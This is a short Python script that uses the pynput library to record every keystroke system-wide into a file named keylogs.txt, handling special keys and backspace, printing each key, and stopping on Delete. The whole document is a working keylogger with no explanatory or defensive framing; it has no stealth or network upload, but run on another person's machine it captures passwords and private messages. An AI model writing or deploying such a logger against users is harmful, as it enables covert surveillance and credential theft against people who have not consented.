from pynput.keyboard import Key, Listener

def show(key):
    try:
        # Regular character keys
        log = key.char
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            log = ' '
        elif key == Key.enter:
            log = '\n'
        elif key == Key.tab:
            log = '\t'
        elif key == Key.backspace:
            # Read current content, remove last char, and write back
            with open("keylogs.txt", "r+") as log_file:
                content = log_file.read()
                log_file.seek(0)
                log_file.write(content[:-1])
                log_file.truncate()
            return  # No further action needed
        else:
            log = ''

    if log:
        with open("keylogs.txt", "a") as log_file:
            log_file.write(log)

    print(f"Logged: {repr(log)}")  # For debug

    if key == Key.delete:
        return False

with Listener(on_press=show) as listener:
    listener.join()
